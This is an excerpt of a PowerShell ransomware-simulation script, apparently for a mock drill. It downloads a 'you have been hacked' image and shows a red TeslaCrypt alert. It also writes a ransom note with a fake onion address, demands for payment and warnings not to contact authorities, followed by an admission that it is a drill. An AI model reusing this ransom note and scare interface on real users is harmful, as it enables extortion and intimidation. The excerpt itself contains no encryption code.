...
Invoke-WebRequest -useb https://raw.githubusercontent.com/IAMinZoho/WorkinProgress/main/uhavebeenhacked.png -Outfile $env:temp\PSWall.jpg
...
$form.Text = "ALERT! TESLACRYPT v2.0!" 
...
$label.ForeColor = "Red"
$label.Text = "All your files have been encrypted by TeslaCrypt!" 
$label.AutoSize = $true 
...
function CreateReadme {
   $ReadmeTXT = "Your network has been breached and all data were encrypted.`r`nPersonal data, financial reports and important documents are ready to disclose. To decrypt all the data or to prevent exfiltrated files to be disclosed at:`r`n`r`nhttp://thisisafakeonionaddress.onion/`r`n`r`nYou will need to purchase our decryption software.`r`n`r`nFollow the guidelines below to avoid losing your data:`r`n`r`n  Do not shutdown or reboot your computers, unmount external storages.`r`n  Do not try to decrypt data using third party software. It may cause irreversible damage.`r`n  Do not fool yourself. Encryption has perfect secrecy and it’s impossible to decrypt without knowing the key.`r`n  Do not modify, rename or delete *.psr files. Your data will be undecryptable.`r`n  Do not report to authorities. The negotiation process will be terminated immediately and the key will be erased.`r`n  Do not reject to purchase. Your sensitive data will be publicly disclosed.`r`n`r`n`r`nIT IS A MOCK DRILL (You wont see the text bellow in real ransomeware attacks).`r`n`r`nAll your files have been encrypted!`r`nBut don't worry, you can still recover them with the recovery key :)`r`n"
